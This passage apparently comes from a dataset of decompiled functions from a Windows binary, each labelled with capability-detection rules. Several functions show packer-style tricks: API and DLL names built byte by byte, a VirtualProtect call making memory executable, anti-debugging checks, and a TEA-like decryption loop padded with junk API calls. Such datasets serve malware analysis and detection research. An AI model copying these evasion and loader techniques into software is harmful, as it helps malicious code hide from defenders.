(arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x5bcc14 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x5bcc14 < iVar12) {\n                if (iVar12 < *0x5bcc10) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x5bcc10;\n                    uVar5 = 1;\n                }\n                goto code_r0x00412711;\n            }\n            var_10h = *0x5bcc14 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x004124fd;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x004124fd:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x00412711:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3656
    },
    "00412754": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412754(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x00412c55;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x5bcc30 - 1;\n        iVar4 = *0x5bcc30 + (*0x5bcc30 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x5bcc30 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x00412889;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x00412890;\ncode_r0x00412889:\n                        do {\n                            var_4h = 1;\ncode_r0x00412890:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0041289e;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0041289e:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x5bcc2c - *0x5bcc30) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x5bcc2c < iVar12) {\n                if (iVar12 < *0x5bcc28) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x5bcc3c;\n                    iVar4 = *0x5bcc34 + (*0x5bcc34 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x5bcc34 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x5bcc34 + (*0x5bcc34 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x5bcc34 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x5bcc3c + *0x5bcc28;\n                    uVar5 = 1;\n                }\n                goto code_r0x00412c55;\n            }\n            var_10h = *0x5bcc2c - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x5bcc30 - 1;\n            iVar12 = *0x5bcc30 + (*0x5bcc30 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x5bcc30 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x00412a41;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x00412a41:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x5bcc34 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x00412c55:\n    var_20h = iVar12 << (0x1fU - *0x5bcc34 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x5bcc38 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x5bcc38 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3638
    },
    "00403597": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403597(uint32_t arg_8h)\n\n{\n    fcn.0040358c();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405a17();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "00404cd7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404cd7(uint32_t arg_8h)\n\n{\n    fcn.00404c2d();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405a17();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00404d1c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d1c(uint32_t arg_8h)\n\n{\n    fcn.00404cf6();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405a17();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00404fff": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404fff(uint32_t arg_8h)\n\n{\n    fcn.00404ff4();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405a17();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "004057f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004057f0(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x401660;\n    fcn.00404cf6();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405a17();\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "004059a5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004059a5(uint32_t arg_8h)\n\n{\n    fcn.00405982();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405a17();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "004059d6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004059d6(uint32_t arg_8h)\n\n{\n    fcn.004059c6();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405a17();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00408b96": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408b96(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4018c0;\n    fcn.00405982();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405a17();\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "0041177f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041177f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040a6d0(0x417f18, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.0040710a();\n        *puVar2 = 0;\n        puVar2 = fcn.004070f7();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x5d7270)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x5d7280;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.00414d17(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.004070f7();\n                    *puVar2 = 9;\n                    puVar2 = fcn.0040710a();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0041104c(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00411851(0x417f18);\n                goto code_r0x0041184b;\n            }\n        }\n        puVar2 = fcn.0040710a();\n        *puVar2 = 0;\n        puVar2 = fcn.004070f7();\n        *puVar2 = 9;\n        fcn.00405e12(0, 0, 0, 0, 0);\n    }\ncode_r0x0041184b:\n    fcn.0040a715();\n    return;\n}\n",
        "token_count": 635
    },
    "00403668": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid fcn.00403668(void)\n\n{\n    *0x5d6398 = 0x6d;\n    *0x5d639a = 0x73;\n    *0x5d63a2 = 0x33;\n    *0x5d63ae = 0;\n    *0x5d63a0 = 0x67;\n    *0x5d63a8 = 100;\n    *0x5d639e = 0x6d;\n    *0x5d63aa = 0x6c;\n    *0x5d63a6 = 0x2e;\n    *0x5d63ac = 0x6c;\n    *0x5d63a4 = 0x32;\n    *0x5d639c = 0x69;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x5d6398);\n    return;\n}\n",
        "token_count": 209
    },
    "0040372a": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040372a(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    *arg_8h = *arg_8h ^ arg_ch;\n    return;\n}\n",
        "token_count": 55
    },
    "0040374f": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040374f(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t extraout_EDX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint lpOutBuffer;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t lpBytesRead;\n    \n    var_18h = *arg_ch;\n    var_14h = arg_ch[1];\n    uVar2 = *arg_8h;\n    var_10h = arg_ch[2];\n    var_1ch = arg_ch[3];\n    uVar3 = arg_8h[1];\n    var_8h = -0x3910c8e0;\n    var_ch = uVar2;\n    if (*0x5d6394 == 0x60b) {\n        (*_sym.imp.KERNEL32.dll_CallNamedPipeW)(0x401300, 0, 0, &lpOutBuffer, 0, &lpBytesRead, 0);\n    }\n    do {\n        lpBytesRead = uVar2 * 0x10 + var_10h;\n        uVar1 = (uVar2 >> 5) + var_1ch;\n        *0x5d5f44 = 0xffcf03fc;\n        fcn.0040372a(&lpBytesRead, var_8h + uVar2);\n        *0x5d5f44 = 0;\n        uVar3 = uVar3 - (uVar1 ^ lpBytesRead);\n        *0x5d5f4c = 0xffffffff;\n        *0x5d5f48 = 0xff6b3619;\n        lpBytesRead = uVar3;\n        fcn.004036fd(&var_ch, uVar3 * 0x10 + var_18h ^ (uVar3 >> 5) + var_14h ^ uVar3 + var_8h);\n        if (*0x5d6394 != 0x93) {\n            var_8h = var_8h + 0x61c88647;\n        }\n        uVar2 = var_ch;\n    } while (extraout_EDX != 1);\n    arg_8h[1] = uVar3;\n    *arg_8h = var_ch;\n    return;\n}\n",
        "token_count": 563
    },
    "0040386a": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040386a(int32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    for (arg_ch = arg_ch >> 3; arg_ch != 0; arg_ch = arg_ch - 1) {\n        if (*0x5d6394 == 0xb7d) {\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasExesLengthW)();\n        }\n        if (*0x5d6394 == 0x1c) {\n            (*_sym.imp.KERNEL32.dll_OpenMutexA)(0, 0, 0x401330);\n            (*_sym.imp.KERNEL32.dll_EnumDateFormatsA)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_EnumSystemCodePagesW)(0, 0);\n        }\n        fcn.0040374f(arg_8h, arg_10h);\n        arg_8h = arg_8h + 8;\n    }\n    return;\n}\n",
        "token_count": 221
    },
    "00403a41": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.00403a41(void)\n\n{\n    uint var_4h;\n    \n    *0x5bd14e = 0x33;\n    *0x5bd14f = 0x32;\n    *0x5bd153 = 0x6c;\n    *0x5bd152 = 0x6c;\n    *0x5bd14b = 0x6e;\n    *0x5bd14d = 0x6c;\n    *0x5bd148 = 0x6b;\n    *0x5bd14c = 0x65;\n    *0x5bd14a = 0x72;\n    *0x5bd150 = 0x2e;\n    *0x5bd151 = 100;\n    *0x5bd149 = 0x65;\n    *0x5bd154 = 0;\n    *0x5d6390 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x5bd148);\n    *0x5bd153 = 0x65;\n    *0x5bd149 = 0x69;\n    *0x5bd14c = 0x75;\n    *0x5bd14e = 0x6c;\n    *0x5bd14d = 0x61;\n    *0x5bd151 = 0x6f;\n    *0x5bd155 = 0x74;\n    *0x5bd148 = 0x56;\n    *0x5bd154 = 99;\n    *0x5bd14f = 0x50;\n    *0x5bd156 = 0;\n    *0x5bd14b = 0x74;\n    *0x5bd152 = 0x74;\n    *0x5bd14a = 0x72;\n    *0x5bd150 = 0x72;\n    *0x5bd144 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x5d6390, 0x5bd148);\n    (**0x5bd144)(*0x5d5f40, *0x5d6394, 0x40, &var_4h);\n    return;\n}\n",
        "token_count": 496
    },
    "004054ed": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_54h\n\nvoid fcn.004054ed(void)\n\n{\n    uint32_t arg_ch;\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint32_t uVar7;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch_2;\n    uint var_10h_2;\n    uint var_14h;\n    uint var_10h;\n    uint var_54h;\n    uint var_38h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h_2;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004062fc();\n    *(unaff_EBP + -0x10) = &stack0xffffffac;\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    uVar1 = fcn.00404689();\n    arg_ch = *(unaff_EBP + 0x10);\n    if (arg_ch != 0) {\n        uVar2 = fcn.0040469f();\n        *(unaff_EBP + -0x18) = uVar2;\n        iVar3 = fcn.0040490e();\n        iVar5 = *(unaff_EBP + -0x18);\n        if (iVar3 - iVar5 < arg_ch) {\n            iVar3 = fcn.0040504f();\n            iVar5 = extraout_ECX_00;\n        }\n        uVar7 = iVar5 + arg_ch;\n        